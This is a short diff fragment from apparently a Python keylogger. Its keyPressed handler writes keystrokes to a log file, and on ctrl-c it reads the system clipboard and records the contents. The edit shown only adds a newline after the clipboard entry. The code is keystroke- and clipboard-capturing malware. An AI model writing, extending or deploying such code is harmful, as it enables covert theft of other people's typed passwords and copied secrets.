@@ -66,7 +66,7 @@ def keyPressed(key):
                 if char == b'\x03':
                     logKey.write("<ctrl-c>")
                     clipboard_contents = get_clipboard_contents()
-                    logKey.write(f"\n[Clipboard: {clipboard_contents}]")
+                    logKey.write(f"\n[Clipboard: {clipboard_contents}]\n")
                 elif char == b'\x16':
                     logKey.write("<ctrl-v>")
 
